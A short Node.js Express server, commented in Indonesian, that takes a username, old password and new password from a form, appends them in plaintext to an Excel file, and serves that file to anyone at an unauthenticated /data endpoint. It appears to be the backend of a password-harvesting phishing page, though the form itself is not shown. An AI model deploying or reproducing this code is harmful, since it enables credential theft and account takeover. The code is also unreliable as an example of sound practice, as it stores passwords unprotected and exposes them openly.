const express = require("express");
const bodyParser = require("body-parser");
const XLSX = require("xlsx");
const path = require("path");
const fs = require("fs");

const app = express();
const PORT = 3003;

// Middleware untuk parsing data
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Melayani file HTML
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

// Endpoint untuk menyimpan data ke Excel
app.post("/save", (req, res) => {
    const { username, password, newpassword } = req.body;

    // Data yang akan disimpan
    const data = [
        ["Username", "Old Password", "New Password"],
        [username, password, newpassword],
    ];

    const filePath = path.join(__dirname, "user_data.xlsx");

    // Cek apakah file sudah ada
    let workbook;
    if (fs.existsSync(filePath)) {
        workbook = XLSX.readFile(filePath);
        const sheet = workbook.Sheets["Data"];
        const existingData = XLSX.utils.sheet_to_json(sheet, { header: 1 });
        existingData.push([username, password, newpassword]);
        workbook.Sheets["Data"] = XLSX.utils.aoa_to_sheet(existingData);
    } else {
        workbook = XLSX.utils.book_new();
        const worksheet = XLSX.utils.aoa_to_sheet(data);
        XLSX.utils.book_append_sheet(workbook, worksheet, "Data");
    }

    XLSX.writeFile(workbook, filePath);

    // Mengarahkan pengguna kembali ke halaman utama dengan parameter query success
    res.redirect('/?success=true');
});

// Jalankan server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});

app.get("/data", (req, res) => {
    const filePath = path.join(__dirname, "user_data.xlsx");
    if (fs.existsSync(filePath)) {
        res.download(filePath); // Kirim file ke browser
    } else {
        res.status(404).send("No data found");
    }
});
